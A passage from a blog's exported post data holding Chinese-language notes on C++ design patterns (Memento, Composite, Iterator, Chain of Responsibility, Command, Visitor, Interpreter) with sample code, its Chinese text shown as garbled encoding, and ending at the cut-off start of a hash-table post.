implemented only for printing purpose void setState( const int s ) &#123; std::cout &lt;&lt; \"Set state to \" &lt;&lt; s &lt;&lt; \".\" &lt;&lt; std::endl; state = s; &#125; // implemented only for printing purpose int getState() &#123; return state; &#125; void setMemento( Memento* const m ) &#123; state = m-&gt;getState(); &#125; Memento *createMemento() &#123; return new Memento( state ); &#125;private: int state; // ...&#125;;/* * CareTaker * is responsible for the memento's safe keeping */class CareTaker&#123;public: CareTaker( Originator* const o ) : originator( o ) &#123;&#125; ~CareTaker() &#123; for ( unsigned int i = 0; i &lt; history.size(); i++ ) &#123; delete history.at( i ); &#125; history.clear(); &#125; void save() &#123; std::cout &lt;&lt; \"Save state.\" &lt;&lt; std::endl; history.push_back( originator-&gt;createMemento() ); &#125; void undo() &#123; if ( history.empty() ) &#123; std::cout &lt;&lt; \"Unable to undo state.\" &lt;&lt; std::endl; return; &#125; Memento *m = history.back(); originator-&gt;setMemento( m ); std::cout &lt;&lt; \"Undo state.\" &lt;&lt; std::endl; history.pop_back(); delete m; &#125; // ...private: Originator *originator; std::vector&lt;Memento*&gt; history; // ...&#125;;int main()&#123; Originator *originator = new Originator(); CareTaker *caretaker = new CareTaker( originator ); originator-&gt;setState( 1 ); caretaker-&gt;save(); originator-&gt;setState( 2 ); caretaker-&gt;save(); originator-&gt;setState( 3 ); caretaker-&gt;undo(); std::cout &lt;&lt; \"Actual state is \" &lt;&lt; originator-&gt;getState() &lt;&lt; \".\" &lt;&lt; std::endl; delete originator; delete caretaker; return 0;&#125; æ•°æ®ç»“æ„ç›¸å…³æ¨¡å¼ å‡å¦‚å­˜åœ¨ä¸€äº›æ•°æ®ç»“æ„ï¼Œå¦‚æœè®©å®¢æˆ·ç¨‹åºç›´æ¥ä¾èµ–å®ƒä»¬ï¼Œä¼šç ´åç»„ä»¶çš„å¤ç”¨æ€§ã€‚æ¯”å¦‚è¯´æ¥å£çš„ä¸ç»Ÿä¸€ï¼Œå¯¼è‡´æºä»£ç éœ€è¦é¢‘ç¹æ”¹å˜ã€‚ è¿™æ—¶å€™ï¼Œå¯¹è¿™äº›æ•°æ®ç»“æ„è¿›è¡Œå°è£…ï¼Œå¯¹å¤–æä¾›ç»Ÿä¸€çš„æ¥å£ï¼Œæ¥å®ç°ä¸æ•°æ®ç»“æ„æ— å…³çš„è®¿é—®ã€‚ å…¸å‹æ¨¡å¼ï¼š Composite Iterator Chain of Responsibility Composite å¤„ç†å¯¹å†…éƒ¨æ•°æ®ç»“æ„å¤æ‚å®ç°çš„ä¾èµ–ï¼ŒCompositeå°†å¯¹è±¡ç»„åˆæˆæ ‘å½¢ç»“æ„ä»¥è¡¨ç¤ºâ€œéƒ¨åˆ†-æ•´ä½“â€çš„å±‚æ¬¡ç»“æ„ã€‚ Compositeä½¿å¾—ç”¨æˆ·å¯¹å•ä¸ªå¯¹è±¡å’Œç»„åˆå¯¹è±¡çš„ä½¿ç”¨å…·æœ‰ä¸€è‡´æ€§ã€‚ æŠ½è±¡ä»£ç ç»“æ„ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#include &lt;iostream&gt;#include &lt;vector&gt;/* * Component * defines an interface for all objects in the composition * both the composite and the leaf nodes */class Component&#123;public: virtual ~Component() &#123;&#125; virtual Component *getChild( int ) &#123; return 0; &#125; virtual void add( Component * ) &#123; /* ... */ &#125; virtual void remove( int ) &#123; /* ... */ &#125; virtual void operation() = 0;&#125;;/* * Composite * defines behavior of the components having children * and store child components */class Composite : public Component&#123;public: ~Composite() &#123; for ( unsigned int i = 0; i &lt; children.size(); i++ ) &#123; delete children[ i ]; &#125; &#125; Component *getChild( const unsigned int index ) &#123; return children[ index ]; &#125; void add( Component *component ) &#123; children.push_back( component ); &#125; void remove( const unsigned int index ) &#123; Component *child = children[ index ]; children.erase( children.begin() + index ); delete child; &#125; void operation() &#123; for ( unsigned int i = 0; i &lt; children.size(); i++ ) &#123; children[ i ]-&gt;operation(); &#125; &#125; private: std::vector&lt;Component*&gt; children;&#125;;/* * Leaf * defines the behavior for the elements in the composition, * it has no children */class Leaf : public Component&#123;public: Leaf( const int i ) : id( i ) &#123;&#125; ~Leaf() &#123;&#125; void operation() &#123; std::cout &lt;&lt; \"Leaf \"&lt;&lt; id &lt;&lt;\" operation\" &lt;&lt; std::endl; &#125;private: int id;&#125;;int main()&#123; Composite composite; for ( unsigned int i = 0; i &lt; 5; i++ ) &#123; composite.add( new Leaf( i ) ); &#125; composite.remove( 0 ); composite.operation(); return 0;&#125; Compositeçš„operation()ä¸­å¤„ç†åˆ°äº†Compositeç±»å‹å¯¹è±¡ï¼Œä¼šç»§ç»­å¤„ç†å…¶childrenã€‚ å…¸å‹çš„ Compositeå¯¹è±¡ç»“æ„å¦‚ä¸‹å›¾ï¼š Iterator ä¸ç®¡å†…éƒ¨çš„æ•°æ®ç»“æ„å¦‚ä½•å®šä¹‰ï¼ŒIteratorä½¿ç”¨ç»Ÿä¸€æ¥å£ï¼Œéšè—å†…éƒ¨å®ç°ï¼Œä¾›å¤–éƒ¨ä½¿ç”¨å„ç§æ•°æ®ç»“æ„ã€‚ Iteratoræä¾›ä¸€ç§æ–¹æ³•é¡ºåºè®¿é—®ä¸€ä¸ªèšåˆå¯¹è±¡ä¸­å„ä¸ªå…ƒç´  , è€Œåˆä¸éœ€æš´éœ²è¯¥å¯¹è±¡çš„å†…éƒ¨è¡¨ç¤ºã€‚ è¿™ä¸ªæ¨¡å¼åœ¨C++ä¸­ï¼Œå¹¶ä¸æ˜¯å®ç°ç›®çš„çš„æœ€ä¼˜é€‰æ‹©ã€‚STLä¸­æ³›å‹ç¼–ç¨‹å®ç°çš„Iteratoræ¯”é¢å‘å¯¹è±¡è®¾è®¡æ¨¡å¼å®ç°çš„Iteratorï¼Œæ›´é«˜æ•ˆã€‚ æŠ½è±¡ä»£ç ç»“æ„ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141#include &lt;iostream&gt;#include &lt;stdexcept&gt;#include &lt;vector&gt;class Iterator;class ConcreteAggregate;/* * Aggregate * defines an interface for aggregates and it decouples your * client from the implementation of your collection of objects */class Aggregate&#123;public: virtual ~Aggregate() &#123;&#125; virtual Iterator *createIterator() = 0; // ...&#125;;/* * Concrete Aggregate * has a collection of objects and implements the method * that returns an Iterator for its collection * */class ConcreteAggregate : public Aggregate&#123;public: ConcreteAggregate( const unsigned int size ) &#123; list = new int[size](); count = size; &#125; ~ConcreteAggregate() &#123; delete[] list; &#125; Iterator *createIterator(); unsigned int size() const &#123; return count; &#125; int at( unsigned int index ) &#123; return list[ index ]; &#125; // ...private: int *list; unsigned int count; // ...&#125;;/* * Iterator * provides the interface that all iterators must implement and * a set of methods for traversing over elements */class Iterator&#123;public: virtual ~Iterator() &#123; /* ... */ &#125; virtual void first() = 0; virtual void next() = 0; virtual bool isDone() const = 0; virtual int currentItem() const = 0; // ...&#125;;/* * Concrete Iterator * implements the interface and is responsible for managing * the current position of the iterator */class ConcreteIterator : public Iterator&#123;public: ConcreteIterator( ConcreteAggregate *l ) : list( l ), index( 0 ) &#123;&#125; ~ConcreteIterator() &#123;&#125; void first() &#123; index = 0; &#125; void next() &#123; index++; &#125; bool isDone() const &#123; return ( index &gt;= list-&gt;size() ); &#125; int currentItem() const &#123; if ( isDone() ) &#123; return -1; &#125; return list-&gt;at(index); &#125; // ...private: ConcreteAggregate *list; unsigned int index; // ...&#125;;Iterator *ConcreteAggregate::createIterator()&#123; return new ConcreteIterator( this );&#125;int main()&#123; unsigned int size = 5; ConcreteAggregate list = ConcreteAggregate( size ); Iterator *it = list.createIterator(); for ( ; !it-&gt;isDone(); it-&gt;next()) &#123; std::cout &lt;&lt; \"Item value: \" &lt;&lt; it-&gt;currentItem() &lt;&lt; std::endl; &#125; delete it; return 0;&#125; é¢å‘å¯¹è±¡çš„Iteratorï¼Œç›¸æ¯”STLçš„Iteratorï¼Œå…¶ä»£ä»·åœ¨äºConcreteIteratorè¿™ç§å­ç±»è°ƒç”¨è™šå‡½æ•°çš„ä»£ä»·ã€‚ è¿™ç§é€šè¿‡è™šå‡½æ•°å®ç°å¤šæ€è°ƒç”¨çš„æ–¹æ³•ï¼Œæ˜¯è¿è¡Œæ—¶å¤šæ€ã€‚ STLé€šè¿‡æ¨¡æ¿æ”¯æŒä¸åŒçš„æ•°æ®ç»“æ„ï¼Œæ˜¯ç¼–è¯‘æ—¶å¤šæ€ï¼Œç”±ç¼–è¯‘å™¨ç›´æ¥æ¨æ–­å‡ºå…·ä½“ç±»å‹ã€‚æ˜¾ç„¶ï¼Œå°±ç¨‹åºè¿è¡Œæ—¶æ•ˆç‡è€Œè¨€ï¼Œæ³›å‹ç¼–ç¨‹çš„æ–¹å¼æ•ˆç‡ä¼šæ›´é«˜ã€‚ ç„¶è€Œåœ¨ä¸€äº›ä¸æ”¯æŒæ³›å‹ç¼–ç¨‹çš„è¯­è¨€ç§ï¼ŒIteratorè®¾è®¡æ¨¡å¼è¿˜æ˜¯æœ‰åº”ç”¨çš„ã€‚ Chain of Responsibility å½“ä¸€ä¸ªè¯·æ±‚å¯ä»¥è¢«å¤šä¸ªå¯¹è±¡å¤„ç†ï¼Œä½†æ˜¯æ¯æ¬¡ä»…ä¼šæœ‰ä¸€ä¸ªå¯¹è±¡å®Œæˆå¤„ç†æ“ä½œï¼Œæ­¤æ—¶ï¼Œå¦‚æœæ˜¾ç¤ºçš„ä¸€ç§æƒ…å†µä¸€ç§æƒ…å†µåœ°å»æŒ‡å®šå¤„ç†å¯¹è±¡ï¼Œé‚£ä¹ˆå®ç°ä¼šå¾ˆå¤æ‚ã€‚ Chain of Responsibilityä½¿å¤šä¸ªå¯¹è±¡éƒ½æœ‰æœºä¼šå¤„ç†è¯·æ±‚ï¼Œä»è€Œé¿å…è¯·æ±‚çš„å‘é€è€…å’Œæ¥æ”¶è€…ä¹‹é—´çš„è€¦åˆå…³ç³»ã€‚å°†è¿™äº›å¯¹è±¡è¿æˆä¸€æ¡é“¾ï¼Œå¹¶æ²¿ç€è¿™æ¡é“¾ä¼ é€’è¯¥è¯·æ±‚ï¼Œç›´åˆ°æœ‰ä¸€ä¸ªå¯¹è±¡å¤„ç†å®ƒä¸ºæ­¢ã€‚ ä¸€ä¸ªé“¾è¡¨ä¸­æ‰€æœ‰å¯¹è±¡ï¼Œä¾æ¬¡å¤„ç†ä¸€ä¸ªè¯·æ±‚ã€‚æœ€åæ²¡æœ‰è¢«å¤„ç†çš„è¯·æ±‚ï¼Œåº”å½“è®¾ç½®é»˜è®¤çš„å“åº”æœºåˆ¶ã€‚ æŠ½è±¡ä»£ç ç»“æ„ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102#include &lt;iostream&gt;/* * Handler * defines an interface for handling requests and * optionally implements the successor link */class Handler&#123;public: virtual ~Handler() &#123;&#125; virtual void setHandler( Handler *s ) &#123; successor = s; &#125; virtual void handleRequest() &#123; if (successor != 0) &#123; successor-&gt;handleRequest(); &#125; &#125; // ...private: // ç›¸å½“äºé“¾è¡¨çš„nextæŒ‡é’ˆ Handler *successor;&#125;;/* * Concrete Handlers * handle requests they are responsible for */class ConcreteHandler1 : public Handler&#123;public: ~ConcreteHandler1() &#123;&#125; bool canHandle() &#123; // ... return false; &#125; virtual void handleRequest() &#123; if ( canHandle() ) &#123; std::cout &lt;&lt; \"Handled by Concrete Handler 1\" &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; \"Cannot be handled by Handler 1\" &lt;&lt; std::endl; Handler::handleRequest(); &#125; // ... &#125; // ...&#125;;class ConcreteHandler2 : public Handler&#123;public: ~ConcreteHandler2() &#123;&#125; bool canHandle() &#123; // ... return true; &#125; virtual void handleRequest() &#123; if ( canHandle() ) &#123; std::cout &lt;&lt; \"Handled by Handler 2\" &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; \"Cannot be handled by Handler 2\" &lt;&lt; std::endl; Handler::handleRequest(); &#125; // ... &#125; // ...&#125;;int main()&#123; ConcreteHandler1 handler1; ConcreteHandler2 handler2; // è®¾ç½®é“¾å¼å¤„ç†é¡ºåº handler1.setHandler( &amp;handler2 ); handler1.handleRequest(); return 0;&#125; è¡Œä¸ºå˜åŒ–ç›¸å…³æ¨¡å¼ åœ¨ç»„ä»¶æ„å»ºè¿‡ç¨‹ä¸­ï¼Œç»„ä»¶è¡Œä¸ºä¼šå‘ç”Ÿå˜åŒ–ï¼Œå¹¶ä¸”å› æ­¤å¯¼è‡´ç»„ä»¶ä¸å¾—ä¸é‡æ–°å®ç°ã€‚è¡Œä¸ºä¸€èˆ¬å°±æ˜¯å…·ä½“çš„æˆå‘˜æ–¹æ³•å®ç°ã€‚ è¡Œä¸ºå˜åŒ–ç›¸å…³æ¨¡å¼ï¼Œå°±æ˜¯å°†ç»„ä»¶çš„è¡Œä¸ºå’Œç»„ä»¶è‡ªèº«è¿›è¡Œè§£è€¦ã€‚åˆ†éš”å‡ºå˜åŒ–çš„è¡Œä¸ºéƒ¨åˆ†ã€‚ å…¸å‹æ¨¡å¼ï¼š Command Visitor Command å°†è¡Œä¸ºæŠ½è±¡ä¸ºå¯¹è±¡ï¼Œæœ‰ç‚¹ç±»ä¼¼C++çš„å‡½æ•°å¯¹è±¡ã€‚ Commandæ¨¡å¼å°†ä¸€ä¸ªè¯·æ±‚å°è£…ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œä»è€Œä½¿ä½ å¯ç”¨ä¸åŒçš„è¯·æ±‚å¯¹å®¢æˆ·è¿›è¡Œå‚æ•°åŒ–ï¼›å¯¹è¯·æ±‚ï¼ˆæ­¤æ—¶æ˜¯ä¸€ä¸ªå¯å‚¨å­˜çš„å¯¹è±¡ï¼‰æ’é˜Ÿæˆ–è®°å½•è¯·æ±‚æ—¥å¿—ï¼Œä»¥åŠæ”¯æŒå¯æ’¤æ¶ˆçš„æ“ä½œã€‚ Commandæ¨¡å¼ä¹Ÿè¢«ç§°ä¸ºåŠ¨ä½œ( Action )æˆ–äº‹åŠ¡( Transaction )æ¨¡å¼ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798#include &lt;iostream&gt;/* * Receiver * knows how to perform the operations associated * with carrying out a request */class Receiver&#123;public: void action() &#123; std::cout &lt;&lt; \"Receiver: execute action\" &lt;&lt; std::endl; &#125; // ...&#125;;/* * Command * declares an interface for all commands */class Command&#123;public: virtual ~Command() &#123;&#125; virtual void execute() = 0; // ...protected: Command() &#123;&#125;&#125;;/* * Concrete Command * implements execute by invoking the corresponding * operation(s) on Receiver */class ConcreteCommand : public Command&#123;public: ConcreteCommand( Receiver *r ) : receiver( r ) &#123;&#125; ~ConcreteCommand() &#123; if ( receiver ) &#123; delete receiver; &#125; &#125; void execute() &#123; receiver-&gt;action(); &#125; // ... private: Receiver *receiver; // ...&#125;;/* * Invoker * asks the command to carry out the request */class Invoker&#123;public: void set( Command *c ) &#123; command = c; &#125; void confirm() &#123; if ( command ) &#123; command-&gt;execute(); &#125; &#125; // ...private: Command *command; // å¯ä»¥è®¾ç½®ä¸ºå¤šä¸ªcommandçš„å®¹å™¨ // ...&#125;;int main()&#123; ConcreteCommand command( new Receiver() ); Invoker invoker; invoker.set( &amp;command ); invoker.confirm(); return 0;&#125; Commandæ¨¡å¼æœ‰ç‚¹ç±»ä¼¼C++çš„å‡½æ•°å¯¹è±¡ï¼Œä½†æ˜¯ä¸¤è€…ä¹Ÿæœ‰æ˜æ˜¾ä¸åŒã€‚ é¢å‘å¯¹è±¡çš„Commandæ¨¡å¼å¯¹äºæ¥å£çš„å®šä¹‰æ›´åŠ è§„èŒƒçµæ´»ï¼Œä½†æ˜¯æ€§èƒ½ä¼šä½ä¸€äº›ã€‚C++å‡½æ•°å¯¹è±¡åŠ ä¸Šæ¨¡æ¿ï¼Œæ˜¯é€šè¿‡å‡½æ•°ç­¾åæ¥å®šä¹‰æ¥å£ï¼Œå¦å¤–è¿è¡Œæ—¶æ€§èƒ½ä¼šæ›´é«˜ä¸€äº›ã€‚ åœ¨ä¸èƒ½ä½¿ç”¨æ¨¡æ¿å’Œå‡½æ•°å¯¹è±¡çš„è¯­è¨€ä¸­ï¼ŒCommandæ¨¡å¼ä¼šæ¯”è¾ƒå¸¸è§ä¸€äº›ã€‚ Visitor åœ¨æŸäº›å±‚æ¬¡ç»“æ„çš„ç±»ä¸­ï¼Œæ¯”å¦‚ä¸€ä¸ªæŠ½è±¡çˆ¶ç±»ä¸‹æœ‰å¤šä¸ªå­ç±»ï¼Œå¦‚æœéœ€è¦å¢åŠ ä¸€ä¸ªæ–°çš„æ–¹æ³•åˆ°æ‰€æœ‰å­ç±»ä¸­ï¼Œç›´æ¥ä»åŸºç±»å¼€å§‹ä¿®æ”¹çš„è¯ï¼Œæ— ç–‘ä¼šå¾ˆéº»çƒ¦ï¼Œè€Œä¸”ä¸ç¬¦åˆå¯¹ä¿®æ”¹å°é—­çš„è®¾è®¡åŸåˆ™ã€‚ Visitoræ¨¡å¼è¡¨ç¤ºä¸€ä¸ªä½œç”¨äºæŸå¯¹è±¡ç»“æ„ä¸­çš„å„å…ƒç´ çš„æ“ä½œã€‚å®ƒä½¿ä½ å¯ä»¥åœ¨ä¸æ”¹å˜å„å…ƒç´ çš„ç±»çš„å‰æä¸‹å®šä¹‰ä½œç”¨äºè¿™äº›å…ƒç´ çš„æ–°æ“ä½œã€‚ ä½¿ç”¨Visitorç±»æ¥ä¿®æ”¹åŸæ¥çš„ç±»ä¸­çš„æ–¹æ³•ã€‚ æ¯”å¦‚ä»¥ä¸‹ä»£ç  12345678910111213141516171819202122232425262728#include &lt;iostream&gt;using namespace std;class Element&#123;public: virtual void Func1() = 0; virtual void Func2(int data)=0; //æ–°å¢æ–¹æ³• virtual void Func3(int data)=0; virtual ~Element()&#123;&#125;&#125;;class ElementA : public Element &#123;public: void Func1() override&#123;...&#125; void Func2(int data) override&#123;...&#125; // éœ€è¦æ–°å¢æ–¹æ³•&#125;;class ElementB : public Element&#123;public: void Func1() override&#123;...&#125; void Func2(int data) override &#123;...&#125; // éœ€è¦æ–°å¢æ–¹æ³•&#125;; æ–°å¢æ–¹æ³•3ï¼Œéœ€è¦æ›´æ”¹æ‰€æœ‰Elementç±»ã€‚ ä½¿ç”¨Visitoræ¨¡å¼ï¼Œç»“æ„å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;using namespace std;class Element&#123;public: virtual void accept(Visitor&amp; visitor) = 0; //ç¬¬ä¸€æ¬¡å¤šæ€è¾¨æ virtual ~Element()&#123;&#125;&#125;;class ElementA : public Element&#123;public: void accept(Visitor &amp;visitor) override &#123; visitor.visitElementA(*this); &#125; ...&#125;;class ElementB : public Element&#123;public: void accept(Visitor &amp;visitor) override &#123; visitor.visitElementB(*this); //ç¬¬äºŒæ¬¡å¤šæ€è¾¨æ &#125; ...&#125;;class Visitor&#123;public: virtual void visitElementA(ElementA&amp; element) = 0; virtual void visitElementB(ElementB&amp; element) = 0; virtual ~Visitor()&#123;&#125;&#125;; 1234567891011121314151617181920212223242526272829303132333435//æ‰©å±•æ–¹æ³•ï¼Œé€šè¿‡visitElementAã€visitElementBå®ç°class Visitor1 : public Visitor&#123;public: void visitElementA(ElementA&amp; element) override&#123; cout &lt;&lt; \"Visitor1 is processing ElementA\" &lt;&lt; endl; &#125; void visitElementB(ElementB&amp; element) override&#123; cout &lt;&lt; \"Visitor1 is processing ElementB\" &lt;&lt; endl; &#125;&#125;;//æ‰©å±•å¦ä¸€ç§æ–¹æ³•class Visitor2 : public Visitor&#123;public: void visitElementA(ElementA&amp; element) override&#123; cout &lt;&lt; \"Visitor2 is processing ElementA 2\" &lt;&lt; endl; &#125; void visitElementB(ElementB&amp; element) override&#123; cout &lt;&lt; \"Visitor2 is processing ElementB 2\" &lt;&lt; endl; &#125;&#125;;int main() &#123; Visitor2 visitor; ElementB elementB; elementB.accept(visitor); ElementA elementA; elementA.accept(visitor); return 0;&#125; ä½¿ç”¨Visitoræ¨¡å¼ä¹‹åï¼Œåªéœ€è¦æ‰©å±•æ–°çš„Visitorå­ç±»ï¼Œå°±èƒ½å¢åŠ æ–°çš„æ–¹æ³•ã€‚ è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæœ‰ä¸€ç§è¢«ç§°ä¸º double dispatch çš„å®ç°æ–¹æ³•ã€‚ç¬¬ä¸€æ¬¡ dispatch ï¼ŒElementç±»ä¸­çš„acceptæ–¹æ³•ï¼Œè¾¨ææ—¶å“ªä¸€ä¸ªæ‰©å±•çš„Visitorå­ç±»ã€‚ç¬¬äºŒæ¬¡ dispatch ï¼Œacceptæ–¹æ³•å†…visitorçš„æˆå‘˜æ–¹æ³•visitElementXæ–¹æ³•ï¼Œè¾¨æå½“å‰ç±»æ˜¯å“ªä¸€ç§Elementå­ç±»ã€‚ Visitoræ¨¡å¼çš„ä½¿ç”¨æœ‰ä¸€ä¸ªä¸¥æ ¼çš„æ¡ä»¶ï¼ŒElementå­ç±»çš„æ•°ç›®å¿…é¡»æ˜¯å·²çŸ¥çš„ï¼Œä¸”ä¸ä¼šå‘ç”Ÿå˜åŒ–ã€‚å¦åˆ™ï¼Œæ•´ä¸ªè¿‡ç¨‹å°†ä¸å†ç¨³å®šï¼ŒVisitoræ¨¡å¼ä¸å¦‚ä¸ç”¨ã€‚ é¢†åŸŸè§„åˆ™ç›¸å…³æ¨¡å¼ åœ¨ç‰¹å®šé¢†åŸŸä¸­ï¼Œå¯ä»¥å°†å˜åŒ–æ¨¡å¼æŠ½è±¡ä¸ºä¸€äº›è§„åˆ™ï¼Œå°†è¿™äº›è§„åˆ™é€šè¿‡è®¾è®¡è¯­æ³•å®ç°ï¼Œå°±èƒ½è§£å†³ä¸€èˆ¬æ€§çš„é—®é¢˜ã€‚ å…¸å‹æ¨¡å¼ï¼š Interpreter Interpreter å¦‚æœåœ¨è½¯ä»¶æ„å»ºè¿‡ç¨‹ä¸­ï¼ŒæŸäº›ç»“æ„ä¸æ–­åœ°é‡å¤å‡ºç°ã€‚æ„å»ºä¸€ç§è§„åˆ™ï¼Œä½¿å¾—é—®é¢˜å¯ä»¥è¢«è¡¨è¾¾ï¼Œå¹¶é€šè¿‡ä¸€ä¸ªè§£é‡Šå™¨ï¼Œæ¥è§£é‡Šè¿˜åŸè¿™ä¸ªè¡¨è¾¾ã€‚ Interpreteræ¨¡å¼ç»™å®šä¸€ä¸ªè¯­è¨€ï¼Œå®šä¹‰å®ƒçš„æ–‡æ³•çš„ä¸€ç§è¡¨ç¤ºï¼Œå¹¶å®šä¹‰ä¸€ä¸ªè§£é‡Šå™¨ï¼Œè¿™ä¸ªè§£é‡Šå™¨ä½¿ç”¨è¯¥è¡¨ç¤ºæ¥è§£é‡Šè¯­è¨€ä¸­çš„å¥å­ã€‚ å®šä¹‰æ¯”è¾ƒæŠ½è±¡ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œå®ç°ä¸€ä¸ªåŠ å‡æ³•è¡¨è¾¾å¼è¿ç®—ï¼Œå¯ä»¥æŠ½å‘å‡ºåŠ æ³•è¿ç®—æ–‡æ³•åœ°ç±»ã€å‡æ³•è¿ç®—æ–‡æ³•åœ°ç±»ç­‰ï¼Œå®ç°ä¸€ä¸ªè§£é‡Šå™¨å®ŒæˆåŠ å‡è¿ç®—ä¼˜å…ˆçº§çš„å¤„ç†ï¼Œè°ƒç”¨ä¸åŒçš„æ–‡æ³•å¤„ç†æ“ä½œæ•°ã€‚ æŠ½è±¡ä»£ç ç»“æ„ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115#include &lt;iostream&gt;#include &lt;map&gt;/* * Context * contains information that's global to the interpreter */class Context&#123;public: void set( const std::string&amp; var, const bool value) &#123; vars.insert( std::pair&lt;std::string, bool&gt;( var, value ) ); &#125; bool get( const std::string&amp; exp ) &#123; return vars[ exp ]; &#125; // ...private: std::map&lt;std::string, bool&gt; vars; // ...&#125;;/* * Abstract Expression * declares an abstract Interpret operation that is common to all nodes * in the abstract syntax tree */class AbstractExpression&#123;public: virtual ~AbstractExpression() &#123;&#125; virtual bool interpret( Context* const ) &#123; return false; &#125; // ...&#125;;/* * Terminal Expression * implements an Interpret operation associated with terminal symbols * in the grammar (an instance is required for every terminal symbol * in a sentence) */class TerminalExpression : public AbstractExpression&#123;public: TerminalExpression( const std::string&amp; val ) : value( val ) &#123;&#125; ~TerminalExpression() &#123;&#125; bool interpret( Context* const context ) &#123; return context-&gt;get( value ); &#125; // ... private: std::string value; // ...&#125;;/* * Nonterminal Expression * implements an Interpret operation for nonterminal symbols * in the grammar (one such class is required for every rule in the grammar) */class NonterminalExpression : public AbstractExpression&#123;public: NonterminalExpression( AbstractExpression *left, AbstractExpression *right ) : lop( left ), rop( right ) &#123;&#125; ~NonterminalExpression() &#123; delete lop; delete rop; &#125; bool interpret( Context *const context ) &#123; return lop-&gt;interpret( context ) &amp;&amp; rop-&gt;interpret( context ); &#125; // ... private: AbstractExpression *lop; AbstractExpression *rop; // ...&#125;;int main()&#123; // An example of very simple expression tree // that corresponds to expression (A AND B) AbstractExpression *A = new TerminalExpression(\"A\"); AbstractExpression *B = new TerminalExpression(\"B\"); AbstractExpression *exp = new NonterminalExpression( A, B ); Context context; context.set( \"A\", true ); context.set( \"B\", false ); std::cout &lt;&lt; context.get( \"A\" ) &lt;&lt; \" AND \" &lt;&lt; context.get( \"B\" ); std::cout &lt;&lt; \" = \" &lt;&lt; exp-&gt;interpret( &amp;context ) &lt;&lt; std::endl; delete exp; return 0;&#125; å®ç°è¿™ä¸ªæ¨¡å¼æŒºå¤æ‚çš„ï¼Œå¤„ç†ä¸€äº›ç®€å•æƒ…å†µè¿˜è¡Œã€‚å¤ªå¤æ‚çš„æƒ…å†µï¼Œé¢å‘å¯¹è±¡çš„æ–¹å¼æœ¬èº«ä»£ä»·ä¹Ÿæ¯”è¾ƒå¤§ï¼Œæ­¤æ—¶å¯ä»¥è€ƒè™‘ä½¿ç”¨ä¸€äº›è¯­æ³•åˆ†æç”Ÿæˆå™¨æ ‡å‡†å·¥å…·ã€‚ è®¾è®¡æ¨¡å¼å°ç»“ è®¾è®¡æ¨¡å¼çš„ç›®æ ‡æ˜¯ï¼Œæé«˜å¤ç”¨æ€§ï¼Œç®¡ç†åˆ†ç¦»å˜åŒ–çš„éƒ¨åˆ†ã€‚æ‰€ä»¥ï¼Œå¯¹å¤ç”¨æ€§æ²¡æœ‰è¦æ±‚çš„æ—¶å€™ï¼Œè®¾è®¡æ¨¡å¼ä¹Ÿæ²¡é‚£ä¹ˆå¿…è¦ã€‚ ä»€ä¹ˆæ—¶å€™ä¸ç”¨æ¨¡å¼ï¼Ÿä»£ç å¯è¯»æ€§å¾ˆå·®æ—¶ï¼Œä¸ç”¨æ¨¡å¼ã€‚éœ€æ±‚ç†è§£ä¸å……åˆ†æ—¶ï¼Œä¸ç”¨æ¨¡å¼ã€‚ç¨‹åºä¸­å˜åŒ–çš„éƒ¨åˆ†æ²¡æœ‰æ˜¾ç°æ—¶ï¼Œä¸ç”¨æ¨¡å¼ã€‚ä¸æ˜¯ç³»ç»Ÿçš„å…³é”®ä¾èµ–ç‚¹çš„åœ°æ–¹ï¼Œä¸ç”¨æ¨¡å¼ã€‚é¡¹ç›®æ²¡æœ‰å¤ç”¨ä»·å€¼æ—¶ï¼Œä¸ç”¨æ¨¡å¼ã€‚é¡¹ç›®å°†è¦å‘å¸ƒæ—¶ï¼Œä¸ç”¨æ¨¡å¼ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Design Patterns","slug":"Notes/Design-Patterns","permalink":"https://racleray.github.io/categories/Notes/Design-Patterns/"}],"tags":[{"name":"cs basic","slug":"cs-basic","permalink":"https://racleray.github.io/tags/cs-basic/"},{"name":"design patterns","slug":"design-patterns","permalink":"https://racleray.github.io/tags/design-patterns/"}],"author":"HeRui"},{"title":"æ•°æ®ç»“æ„æ•´ç†-part2","slug":"æ•°æ®ç»“æ„æ•´ç†-part2","date":"2021-10-08T13:30:33.000Z","updated":"2023-08-07T11:54:31.042Z","comments":true,"path":"posts/4121feda.html","link":"","permalink":"https://racleray.github.io/posts/4121feda.html","excerpt":"å¸¸è§åŸºæœ¬æ•°æ®ç»“æ„æ•´ç†ç¬¬äºŒéƒ¨åˆ†ï¼Œä½¿ç”¨Cè¯­è¨€ç¼–å†™ã€‚","text":"å“ˆå¸Œè¡¨ å°†keyçš„å€¼é€šè¿‡ä¸€ä¸ªè®¾è®¡å¥½çš„hashå‡½æ•°è½¬æ¢ï¼Œåœ¨è¿ç»­å†…å­˜åœ°å€ä¸Šå¯»å€æ‰¾åˆ°å¯¹åº”çš„å€¼ã€‚ hashå‡½æ•°æ„é€ æ–¹æ³•ï¼š ç›´æ¥å¯»å€æ³•ï¼šå°†keyå€¼çº¿æ€§çš„æ˜ å°„åˆ°å­˜å‚¨åœ°å€ä¸Šã€‚å°‘é‡keyé€‚ç”¨ã€‚ é™¤ç•™ä½™æ•°æ³•ï¼šå°†keyå€¼å¯¹æ•´æ•° p 